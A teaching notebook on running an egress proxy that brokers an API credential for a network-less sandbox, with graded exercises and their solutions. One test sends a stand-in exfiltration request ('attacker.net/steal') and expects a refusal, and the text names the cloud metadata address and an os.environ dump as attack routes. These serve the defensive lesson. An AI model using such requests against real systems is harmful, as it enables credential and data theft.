# %% [markdown]
# # 03 · Egress proxy and secret brokering: the sandbox reaches an API, never the key
#
# **Tier:** T0. The proxy, a stand-in upstream and a sandbox all run in-process here, over a Unix socket.
# Thus the whole pattern works on a laptop with no network. The same proxy runs as a container
# (`deploy/docker/run-with-proxy.sh`) and from a ConfigMap on kind/GKE.
#
# ## The one-minute version
#
# A sandbox that needs *some* network gets exactly one address that it can reach: an egress proxy. The proxy
# decides everything else (PRIMER §4). This is the **gateway path** of the identity primer (`06-gateway`,
# §5). The proxy injects the credential at the edge, and the code never sees it. The proxy does these
# things:
#
# * It keeps an **allowlist** of destinations and refuses everything else. A destination is a named route to
#   an upstream that the operator configured, or an exact/`*.suffix` host for a forward proxy. The proxy
#   also refuses `CONNECT`, because an HTTPS tunnel hides the request, and thus the proxy cannot inject a
#   credential.
# * It **strips** any credential that the caller sent. Then it **injects** the real credential from a file
#   or an environment variable that only the proxy can read. In Kubernetes, that is a Secret mounted into
#   the proxy alone.
# * It **redacts** the injected secret from responses. Thus an upstream that reflects headers cannot leak
#   the secret back into the sandbox.
# * It **guards against SSRF**: it refuses a forward-proxy host that resolves to a private, loopback or
#   link-local address (169.254.169.254).
# * It writes an **audit** line for every decision: one JSON line in the `AuditEvent` shape of the identity
#   lab (`event_type: "egress"`).
#
# The sandbox holds no key, and the proxy holds no code. Neither of them removes the credential risk. They
# move it from the sandbox into one well-defended box. Say that aloud, because it is the honest description.

# %%
import json, os, tempfile
from sandboxlab.proxy import EgressProxy, StubAPI, host_allowed, is_public_ip
from sandboxlab.proxy.client import fetch_json, SANDBOX_CLIENT
from sandboxlab.process import Budgets, ProcessSandbox
from sandboxlab.audit import AuditLog, detect

# The credential lives in a file only the proxy reads (a Kubernetes Secret in the real deployment).
STATE = tempfile.mkdtemp(prefix="nb03-")
os.chmod(STATE, 0o711)
TOKEN = "sk-lab-" + os.urandom(6).hex()
open(os.path.join(STATE, "token"), "w").write(TOKEN)
print("credential written to a file the proxy will read; the sandbox will never see it")

# %% [markdown]
# ## Worked example: the proxy, an upstream that checks the key, and one that reflects it
#
# `StubAPI` takes the place of the third-party API. It has three endpoints:
#
# - `/whoami` says if the expected bearer token arrived (and never echoes it),
# - `/data` returns a document,
# - `/echo` reflects every request header back, and is the reflection channel that an attacker can use to
#   read an injected credential.

# %%
api = StubAPI(TOKEN).serve()
cfg = {"routes": {"weather": {"upstream": api.url, "methods": ["GET"],
                              "inject": {"header": "Authorization", "value_from": f"file:{STATE}/token",
                                         "format": "Bearer {}"}}},
       "forward_allow": ["*.githubusercontent.com"], "allow_connect": False}
proxy = EgressProxy(cfg, unix_path=os.path.join(STATE, "proxy.sock")).serve()
print("proxy listening on", proxy.url)
print("through the route:", fetch_json(proxy.url, "/weather/whoami"))
status, echoed = fetch_json(proxy.url, "/weather/echo")
print("the upstream reflected:", echoed["headers"].get("Authorization"), "| raw token present:", TOKEN in json.dumps(echoed))

# %% [markdown]
# ## Worked example: a network-less sandbox reaching the API through the socket
#
# The process sandbox runs in an empty network namespace (when this machine permits it). The socket path of
# the proxy is in `SANDBOX_PROXY_URL`. `SANDBOX_CLIENT` is a stdlib snippet that the runtime puts before the
# code, thus the code can call `proxy_get`. The code fetches the forecast. Then it makes sure that its own
# environment holds no key.

# %%
sandbox = ProcessSandbox(Budgets(cpu_s=2, wall_s=5), extra_env={"SANDBOX_PROXY_URL": proxy.url})
code = SANDBOX_CLIENT + '''
import os
status, data = proxy_get("/weather/data")
print("forecast:", data)
print("any key in my environment:", any("sk-lab" in v for v in os.environ.values()))
'''
result = sandbox.run(code)
print(result.stdout)
print("exit reason:", result.exit_reason)

# %% [markdown]
# ## Exercise 3.1 — the allowlist
#
# Write the host match for a forward-proxy allowlist. An entry is an exact name, or `*.example.com` for
# subdomains only (not the apex `example.com`, not `evilexample.com`). Compare your function with the
# function of the library.

# %% exercise
def allowed(host: str, patterns: list) -> bool:
    ### BEGIN SOLUTION
    h = host.strip().rstrip(".").lower()
    for p in (p.strip().rstrip(".").lower() for p in patterns):
        if p.startswith("*."):
            if h.endswith(p[1:]) and h != p[2:]:
                return True
        elif h == p:
            return True
    return False
    ### END SOLUTION

# %% check
pats = ["api.weather.example", "*.githubusercontent.com"]
for host, want in [("api.weather.example", True), ("raw.githubusercontent.com", True),
                   ("githubusercontent.com", False), ("api.weather.example.attacker.net", False),
                   ("evilapi.weather.example", False), ("", False)]:
    assert allowed(host, pats) is want == host_allowed(host, pats), host
print("✅ exact names and *.suffix (subdomains only); the apex and look-alikes are refused")

# %% [markdown]
# ## Exercise 3.2 — the credential never reaches the sandbox
#
# Fetch `/weather/echo` through the proxy (the endpoint that reflects headers). Make sure that the injected
# token is **redacted** in the response, and that the raw token appears nowhere. Then fetch with a forged
# `Authorization` header. Make sure that the upstream still sees the *real* header (the proxy stripped the
# header of the caller and replaced it).

# %% exercise
def brokering_holds() -> bool:
    ### BEGIN SOLUTION
    _, reflected = fetch_json(proxy.url, "/weather/echo")
    redacted = reflected["headers"].get("Authorization") == "Bearer [REDACTED]" and TOKEN not in json.dumps(reflected)
    status, body = fetch_json(proxy.url, "/weather/whoami", headers={"Authorization": "Bearer forged"})
    replaced = status == 200 and body["authorized"] is True
    return redacted and replaced
    ### END SOLUTION

# %% check
assert brokering_holds()
print("✅ the proxy strips the caller's header, injects the real key, and redacts it from the response:")
print("   the sandbox reaches the API authenticated, and still holds no credential")

# %% [markdown]
# ## Exercise 3.3 — deny by default, and SSRF
#
# The proxy must refuse a request to each of these three destinations:
#
# - a route that does not exist,
# - a forward-proxy host that is not on the allowlist,
# - a host that resolves to a private/link-local address (the metadata server).
#
# Return the HTTP status that the proxy gives for each. The proxy refuses the metadata-style host at the
# allowlist (403) or at the SSRF check (403).

# %% exercise
def status_for(path_or_url: str) -> int:
    from sandboxlab.proxy.client import fetch
    ### BEGIN SOLUTION
    return fetch(proxy.url, path_or_url)[0]
    ### END SOLUTION

# %% check
assert is_public_ip("8.8.8.8") and not is_public_ip("169.254.169.254") and not is_public_ip("10.0.0.1")
assert status_for("/nope/x") == 403                               # unknown route
assert status_for("http://attacker.net/steal?d=1") == 403          # forward form, not allowlisted
print("✅ unknown route -> 403, non-allowlisted host -> 403; a link-local IP is never 'public'")
print("   (the SSRF guard refuses any forward host that resolves to a private/loopback/link-local address)")

# %% [markdown]
# ## Exercise 3.4 — the egress audit trail, and turning it into alerts
#
# Every decision of the proxy is a JSON line in the `AuditEvent` shape of the identity lab. Put the events
# of the proxy into an `AuditLog`. Then run `detect()`. A denied egress must raise an `egress-denied` alert.
# A response that contained the injected credential must raise `credential-reflection`.

# %% exercise
def alerts_from_proxy() -> set:
    log = AuditLog()
    ### BEGIN SOLUTION
    log.from_proxy(proxy.events, session_id="s1")
    return {a.rule for a in detect(log.events)}
    ### END SOLUTION

# %% check
rules = alerts_from_proxy()
assert "egress-denied" in rules and "credential-reflection" in rules
allow, deny = [e for e in proxy.events if e["decision"] == "allow"], [e for e in proxy.events if e["decision"] == "deny"]
print(f"✅ {len(allow)} allowed + {len(deny)} denied egress events; alerts raised: {sorted(rules)}")

# %%
proxy.close(); api.close()
import shutil; shutil.rmtree(STATE, ignore_errors=True)

# %% [markdown]
# ## In a design review
#
# **Two minutes.** "A sandbox that needs the network gets one address that it can reach: the egress proxy.
# The proxy owns every other decision. It is the gateway path from the identity design, one layer lower.
#
# "The sandbox talks plain HTTP to the proxy. The proxy holds the credential in a Secret mounted only into
# the proxy. It strips whatever the caller sent, injects the real key and speaks HTTPS to the upstream. Thus
# the API authenticates the code, and the code never holds the key.
#
# "The proxy keeps an allowlist of destinations by route or host. It refuses `CONNECT`, because a TLS tunnel hides
# the request from it. It guards against SSRF: it refuses hosts that resolve to private or link-local
# addresses. It redacts the injected secret from responses, thus an endpoint that reflects headers cannot
# give the secret back. Every decision is one audit line, thus a denied egress or a reflected credential
# becomes an alert.
#
# "There are two honest caveats. First, this pattern moves the credential risk into one box, and it does not
# remove the risk. Second, it works only if the network in fact forces the sandbox through the proxy. On a
# laptop, a Unix socket with no other route does this, and on Kubernetes, a default-deny NetworkPolicy to
# the proxy does it. `HTTP_PROXY` environment variables only give advice. The network is the enforcement."
#
# **Drill 1.** *Why not give the sandbox the API key as an environment variable, with a tight scope?* Then a
# prompt injection that runs `print(os.environ)` exfiltrates it. Also, the key is in every core dump and
# crash log.
#
# When the key stays in the proxy, the worst thing that a hijacked sandbox can do is the *allowlisted* call.
# You also rate-limit that call and write an audit line for it. The sandbox cannot go away with the
# credential.
#
# **Drill 2.** *The upstream is HTTPS: can the sandbox not use `CONNECT` through the proxy?* Through a
# `CONNECT` tunnel, the proxy sees only bytes. Thus it cannot inject a credential or control the request,
# and it can only permit or deny a hostname. For this reason, the proxy refuses `CONNECT` and is itself the
# TLS client.
# The sandbox sends plain HTTP to the proxy, and the proxy sends HTTPS to the upstream.
#
# **Drill 3.** *A default-deny NetworkPolicy already blocks egress, so why is the proxy also necessary?* The
# policy decides *if* the sandbox can open a socket to the proxy. The proxy decides *what* that socket can
# do: which host, which path, with which credential, and what comes back. Also, a NetworkPolicy cannot
# inject a key or redact a response. They are different jobs: the network is the enforcement, and the proxy
# is the policy.
